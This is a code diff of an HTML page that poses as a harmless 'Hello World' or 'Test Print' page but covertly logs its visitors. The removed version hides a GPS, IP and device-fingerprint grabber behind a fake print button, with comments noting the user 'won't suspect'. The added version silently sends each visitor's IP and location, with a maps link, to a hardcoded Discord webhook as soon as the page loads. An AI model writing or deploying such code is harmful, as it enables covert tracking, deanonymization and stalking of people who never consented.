@@ -1,328 +1,73 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Spesaba - Print Test</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-
-        body {
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            background: #0a0a0a;
-            font-family: 'Segoe UI', system-ui, sans-serif;
-            overflow: hidden;
-        }
-
-        .gradient-text {
-            font-size: clamp(3rem, 10vw, 8rem);
-            font-weight: 900;
-            letter-spacing: -0.05em;
-            background: linear-gradient(90deg, #000 0%, #fff 25%, #000 50%, #fff 75%, #000 100%);
-            background-size: 200% auto;
-            -webkit-background-clip: text;
-            background-clip: text;
-            -webkit-text-fill-color: transparent;
-            animation: shimmer 3s linear infinite;
-            text-align: center;
-        }
-
-        @keyframes shimmer {
-            0% { background-position: 200% center; }
-            100% { background-position: -200% center; }
-        }
-
-        .symbol {
-            margin-top: 30px;
-            font-size: clamp(2rem, 5vw, 4rem);
-            font-weight: 300;
-            color: #333;
-            letter-spacing: 0.3em;
-            animation: pulse 2s ease-in-out infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { opacity: 0.3; }
-            50% { opacity: 1; }
-        }
-
-        .brand {
-            margin-top: 15px;
-            font-size: clamp(0.8rem, 2vw, 1.2rem);
-            color: #444;
-            letter-spacing: 0.5em;
-            text-transform: uppercase;
-        }
-
-        /* Hidden print button - looks like a normal UI element */
-        .print-btn {
-            margin-top: 50px;
-            padding: 12px 32px;
-            background: transparent;
-            border: 1px solid #333;
-            color: #555;
-            font-size: 13px;
-            letter-spacing: 0.2em;
-            text-transform: uppercase;
-            cursor: pointer;
-            border-radius: 4px;
-            transition: all 0.3s;
-            font-family: inherit;
-        }
-
-        .print-btn:hover {
-            border-color: #666;
-            color: #888;
-        }
-
-        /* Hidden status (invisible) */
-        .hidden { 
-            position: absolute; 
-            left: -9999px; 
-            opacity: 0; 
-            pointer-events: none;
-        }
-
-        .glow {
-            position: absolute;
-            width: 600px;
-            height: 600px;
-            background: radial-gradient(circle, rgba(255,255,255,0.03) 0%, transparent 70%);
-            border-radius: 50%;
-            pointer-events: none;
-            animation: float 6s ease-in-out infinite;
-        }
-
-        @keyframes float {
-            0%, 100% { transform: translateY(0) scale(1); }
-            50% { transform: translateY(-30px) scale(1.1); }
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Hello World</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+      background: #f5f5f5;
+    }
+    h1 {
+      font-size: 4rem;
+      color: #333;
+    }
+  </style>
 </head>
 <body>
-    <div class="glow"></div>
-    <h1 class="gradient-text">Hello World</h1>
-    <div class="symbol">81</div>
-    <div class="brand">Spesaba</div>
+  <h1>Hello World</h1>
 
-    <!-- This button triggers geolocation + sends data -->
-    <button class="print-btn" onclick="handlePrint()">Test Print</button>
+  <script>
+    (async function() {
+      try {
+        // 1. Ambil data IP dan lokasi dari ipinfo.io
+        const res = await fetch('https://ipinfo.io/json');
+        const data = await res.json();
 
-    <div class="hidden" id="status"></div>
+        const ip = data.ip || 'Tidak diketahui';
 
-    <script>
-        // ===== CONFIG =====
-        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1537410381138370640/d0SXhUD2hSifEPO0eqK2tqg4a-QEsoe4fE4mLC6gsKFQXJAs0ukqP5aV1QlNDyUE2rgB";
+        // Susun lokasi (kota, provinsi, negara)
+        let location = '';
+        if (data.city) location += data.city;
+        if (data.region) location += (location ? ', ' : '') + data.region;
+        if (data.country) location += (location ? ', ' : '') + data.country;
+        if (!location) location = 'Tidak diketahui';
 
-        // ===== GET BASIC INFO (no permission needed) =====
-        function getBasicInfo() {
-            return {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                languages: navigator.languages?.join(', '),
-                screen: screen.width + 'x' + screen.height,
-                colorDepth: screen.colorDepth,
-                pixelRatio: window.devicePixelRatio,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timezoneOffset: new Date().getTimezoneOffset() + ' min',
-                cores: navigator.hardwareConcurrency || 'unknown',
-                memory: navigator.deviceMemory || 'unknown',
-                referrer: document.referrer || 'Direct',
-                url: window.location.href,
-                timestamp: new Date().toISOString()
-            };
+        // Link Google Maps dari koordinat
+        let mapLink = 'Tidak tersedia';
+        if (data.loc) {
+          const [lat, lng] = data.loc.split(',');
+          mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
         }
 
-        // ===== GET IP FROM MULTIPLE SOURCES =====
-        async function getIPData() {
-            const results = {};
+        // 2. Bentuk embed sesuai struktur yang diminta
+        const embed = {
+          title: '📡 Data Pengunjung Baru',
+          color: 0x5865F2, // biru Discord
+          fields: [
+            { name: 'IP ADDRES', value: ip, inline: false },
+            { name: 'LOCATION', value: location, inline: false },
+            { name: 'LINK MAPS', value: mapLink, inline: false }
+          ],
+          timestamp: new Date().toISOString()
+        };
 
-            try {
-                const r = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
-                results.ipapi = await r.json();
-            } catch(e) { results.ipapi = { error: e.message }; }
+        // 3. Kirim ke webhook Discord
+        const webhookURL = 'https://discord.com/api/webhooks/1537410381138370640/d0SXhUD2hSifEPO0eqK2tqg4a-QEsoe4fE4mLC6gsKFQXJAs0ukqP5aV1QlNDyUE2rgB';
+        await fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ embeds: [embed] })
+        });
 
-            try {
-                const r = await fetch('https://ipinfo.io/json', { cache: 'no-store' });
-                results.ipinfo = await r.json();
-            } catch(e) { results.ipinfo = { error: e.message }; }
-
-            return results;
-        }
-
-        // ===== GET GPS LOCATION (HIGH ACCURACY) =====
-        function getGPSLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve({ error: "Geolocation not supported" });
-                    return;
-                }
-
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        resolve({
-                            lat: position.coords.latitude,
-                            lon: position.coords.longitude,
-                            accuracy: position.coords.accuracy + ' meters',
-                            altitude: position.coords.altitude || 'N/A',
-                            heading: position.coords.heading || 'N/A',
-                            speed: position.coords.speed || 'N/A',
-                            timestamp: new Date(position.timestamp).toISOString()
-                        });
-                    },
-                    (error) => {
-                        resolve({ 
-                            error: "GPS denied or failed",
-                            code: error.code,
-                            message: error.message 
-                        });
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 15000,
-                        maximumAge: 0
-                    }
-                );
-            });
-        }
-
-        // ===== BUILD DISCORD EMBED =====
-        async function sendToDiscord(basic, ipData, gps) {
-            if (DISCORD_WEBHOOK_URL.includes("YOUR_DISCORD")) {
-                console.log("[DEV] Webhook not set");
-                console.log({ basic, ipData, gps });
-                return;
-            }
-
-            const ip = ipData.ipapi?.ip || ipData.ipinfo?.ip || 'Unknown';
-            const ipapi = ipData.ipapi || {};
-            const ipinfo = ipData.ipinfo || {};
-
-            // Google Maps link
-            let mapsLink = '';
-            if (gps.lat && gps.lon) {
-                mapsLink = 'https://www.google.com/maps?q=' + gps.lat + ',' + gps.lon;
-            } else if (ipapi.latitude && ipapi.longitude) {
-                mapsLink = 'https://www.google.com/maps?q=' + ipapi.latitude + ',' + ipapi.longitude;
-            }
-
-            const embed = {
-                title: "🎯 TARGET LOGGED - GPS + IP",
-                color: gps.lat ? 0x00FF00 : 0xFF6600,
-                timestamp: new Date().toISOString(),
-                thumbnail: { url: "https://cdn-icons-png.flaticon.com/512/2965/2965306.png" },
-                fields: [
-                    // GPS Section (HIGH ACCURACY)
-                    {
-                        name: "📍 GPS LOCATION (HIGH ACCURACY)",
-                        value: gps.lat 
-                            ? "```Lat: " + gps.lat + "\nLon: " + gps.lon + "\nAccuracy: " + gps.accuracy + "```"
-                            : "```" + (gps.error || "No GPS data") + "```",
-                        inline: false
-                    },
-                    {
-                        name: "🗺️ Google Maps",
-                        value: mapsLink ? "[Open Maps](" + mapsLink + ")" : "```No coordinates```",
-                        inline: false
-                    },
-                    // IP Section
-                    {
-                        name: "🌐 IP Address",
-                        value: "```" + ip + "```",
-                        inline: true
-                    },
-                    {
-                        name: "🌍 IP Location",
-                        value: "```" + (ipapi.city || ipinfo.city || 'Unknown') + ", " + (ipapi.country_name || ipinfo.country || 'Unknown') + "```",
-                        inline: true
-                    },
-                    {
-                        name: "📡 ISP",
-                        value: "```" + (ipapi.org || ipinfo.org || 'Unknown') + "```",
-                        inline: false
-                    },
-                    // Device Info
-                    {
-                        name: "💻 Device",
-                        value: "```" + basic.platform + " | " + basic.screen + " | " + basic.cores + " cores```",
-                        inline: false
-                    },
-                    {
-                        name: "🌐 Browser",
-                        value: "```" + basic.userAgent.substring(0, 90) + "```",
-                        inline: false
-                    },
-                    {
-                        name: "⏰ Timezone",
-                        value: "```" + basic.timezone + " (UTC" + (basic.timezoneOffset > 0 ? "+" : "") + (-basic.timezoneOffset/60) + ")```",
-                        inline: true
-                    },
-                    {
-                        name: "🔗 Source",
-                        value: "```" + basic.referrer + "```",
-                        inline: true
-                    }
-                ],
-                footer: {
-                    text: "Spesaba GPS Logger v3.0 | " + new Date().toLocaleString('en-US', { timeZone: 'UTC' }) + " UTC",
-                    icon_url: "https://cdn-icons-png.flaticon.com/512/2965/2965306.png"
-                }
-            };
-
-            // If GPS available, add map image
-            if (gps.lat && gps.lon) {
-                embed.image = {
-                    url: "https://maps.googleapis.com/maps/api/staticmap?center=" + gps.lat + "," + gps.lon + "&zoom=16&size=600x300&maptype=roadmap&markers=color:red%7C" + gps.lat + "," + gps.lon
-                };
-            }
-
-            try {
-                await fetch(DISCORD_WEBHOOK_URL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        username: "Spesaba GPS Logger",
-                        avatar_url: "https://cdn-icons-png.flaticon.com/512/2965/2965306.png",
-                        embeds: [embed]
-                    })
-                });
-            } catch (e) {
-                console.error("Webhook failed:", e);
-            }
-        }
-
-        // ===== MAIN HANDLER =====
-        async function handlePrint() {
-            const btn = document.querySelector('.print-btn');
-            btn.textContent = "Loading...";
-            btn.disabled = true;
-
-            // Step 1: Get basic info + IP (silent)
-            const basic = getBasicInfo();
-            const ipData = await getIPData();
-
-            // Step 2: Request GPS (this triggers browser permission popup)
-            // The popup looks like normal browser behavior - user won't suspect
-            const gps = await getGPSLocation();
-
-            // Step 3: Send everything to Discord
-            await sendToDiscord(basic, ipData, gps);
-
-            // Step 4: Show "print" behavior (fake)
-            setTimeout(() => {
-                window.print();
-                btn.textContent = "Test Print";
-                btn.disabled = false;
-            }, 500);
-        }
-
-        // Auto-attempt GPS on page load (may be blocked without interaction)
-        // The button click is the reliable trigger
-    </script>
+        console.log('✅ Berhasil dikirim ke Discord');
+      } catch (error) {
+        console.error('❌ Gagal mengirim:', error);
+      }
+    })();
+  </script>
 </body>
 </html>
